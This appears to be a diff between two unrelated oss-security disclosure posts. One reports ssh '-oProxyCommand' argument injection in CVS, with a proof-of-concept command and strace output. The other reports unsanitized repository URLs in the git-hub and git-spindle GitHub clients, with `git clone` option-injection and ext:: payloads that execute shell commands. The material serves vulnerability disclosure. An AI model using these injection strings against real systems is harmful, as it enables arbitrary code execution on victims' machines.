@@ -1,50 +1,35 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/08/11/1
-Message-ID: <20170810171047.5cdf7131-a82f-46f0-b4c4-3015acbc431b@korelogic.com>
-Date: Thu, 10 Aug 2017 17:32:24 -0600
-From: Hank Leininger <hlein@...elogic.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/16/3
+Message-ID: <20170216110843.xvy6khoffph6yy45@jwilk.net>
+Date: Thu, 16 Feb 2017 12:08:43 +0100
+From: Jakub Wilk <jwilk@...lk.net>
 To: oss-security@...ts.openwall.com
-Subject: CVS and ssh command injection (see CVE-2017-1000117, etc.)
+Subject: Re: git-hub: missing sanitization of data received from GitHub
 Content-Type: text/plain; charset=utf-8
 
-SSH command injection via -o... impacts CVS 1.12.x as well, if anybody
-still cares.
+* Jakub Wilk <jwilk@...lk.net>, 2016-09-29, 17:40:
+>git-hub <https://github.com/sociomantic-tsunami/git-hub> is a Git 
+>command-line interface to GitHub. When you ask it to clone a 
+>repository, it will call:
+>
+>  git clone <repourl> <reponame>
+>
+>where both <repourl> and <reponame> come from GitHub API, without any 
+>sanitization. Operators of the GitHub server (or a MitM attacker[*]) 
+>could exploit it for directory traversal or, more excitingly, for 
+>arbitrary code execution, either via option injection, e.g.:
+>
+>  git clone 'git://-esystem("cowsay pwned > \x2fdev\x2ftty")/' --config=core.gitProxy=perl
+>
+>or more directly with git-remote-ext, e.g.:
+>
+>  git clone 'ext::sh -c cowsay% pwned% >% /dev/tty' moo
 
-The announcement for git mentions CVE-2017-1000117, CVE-2017-9800, and
-CVE-2017-1000116 for git, Subversion, Mercurial, but makes no mention
-of CVS.  None of those CVEs are currently viewable at
-https://cve.mitre.org/cgi-bin/cvename.cgi?name= , and I don't know if
-these were discussed on a private list prior to publication, and
-whether that discussion included CVS.
+git-spindle is another GitHub CLI, which can be exploited in the same way:
+https://github.com/seveas/git-spindle/issues/154
 
-CVS can be configured to use SSH for remote repos, such as with
-CVS_RSH=ssh.  In which case specifying a hostname of -o... triggers the
-same sort of thing:
-
-  $ strace -f -e execve cvs -d '-oProxyCommand=id;localhost:/bar' co yada 2>&1 | egrep id
-  execve("/usr/bin/cvs", ["cvs", "-d", "-oProxyCommand=id;localhost:/bar", "co", "yada"], 0x7ffe69f75a68 /* 139 vars */) = 0
-  [snip]
-  [pid 20003] execve("/usr/local/bin/ssh", ["ssh", "-oProxyCommand=id;localhost", "cvs server"], 0x5fb1fc8420 /* 141 vars */) = -1 ENOENT (No such file or directory)
-  [pid 20003] execve("/usr/bin/ssh", ["ssh", "-oProxyCommand=id;localhost", "cvs server"], 0x5fb1fc8420 /* 141 vars */) = 0
-  [pid 20004] execve("/bin/bash", ["/bin/bash", "-c", "exec id;localhost"], 0x32af5f10d0 /* 141 vars */) = 0
-  [pid 20004] execve("/usr/bin/id", ["id"], 0xec92226ae0 /* 141 vars */) = 0
-  [pid 20004] +++ exited with 0 +++
-  [pid 20003] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20004, si_uid=3612, si_status=0, si_utime=0, si_stime=0} ---
-  ssh_exchange_identification: Connection closed by remote host
-  [pid 20003] +++ exited with 255 +++
-  --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20003, si_uid=3612, si_status=255, si_utime=0, si_stime=0} ---
-
-Tested vanilla 1.12.13, and Gentoo 1.12.12-r11.
-
-Of course, the repo specification looks very odd, so tricking a victim
-may be harder than for SCM tools where it's prefixed by an ssh:// or
-masked behind a redirect.  Plus, first you would have find a victim.
-
-Thanks,
+(git-spindle used to be called "git-hub", but this is different codebase that 
+sociomantic's git-hub.)
 
 -- 
-
-Hank Leininger <hlein@...elogic.com>
-5F6D DCC8 FF53 8093 EC39  127B 091E 7F7C E898 E86C
-
-Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
+Jakub Wilk
